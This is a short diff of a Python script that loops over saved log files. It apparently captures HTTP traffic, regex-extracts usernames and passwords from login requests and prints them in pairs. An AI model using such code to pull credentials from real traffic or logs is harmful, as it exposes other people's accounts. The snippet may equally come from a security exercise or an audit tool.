@@ -112,12 +112,8 @@ if __name__ == "__main__":
                 with open("logdir/" + file, 'r', encoding='utf-8', errors='ignore') as f:
                     for line in f:
                         if ("username=" in line) and ("password=" in line):
-                            print(re.findall(
-                                "username=(.*?)&password=(.*?)&captcha_code=HTTP/1.1 303 See Other", line))
-                            # username = re.findall("username=(.*?)&password=(.*?)&captcha_code=HTTP/1.1 303 See Other",line)[0]
-                            # passwd = re.findall("username=(.*?)&password=(.*?)&captcha_code=HTTP/1.1 303 See Other", line)[1]
-                            # print("username= %s  password= %s" %
-                            #       (username, passwd))
+                            (username, passwd) = re.findall("username=(.*?)&password=(.*?)&captcha_code=HTTP/1.1 303 See Other", line)[0]
+                            print("username= %s  password= %s" % (username, passwd))
             sending_flag = False
             sleep(1)
     finally:
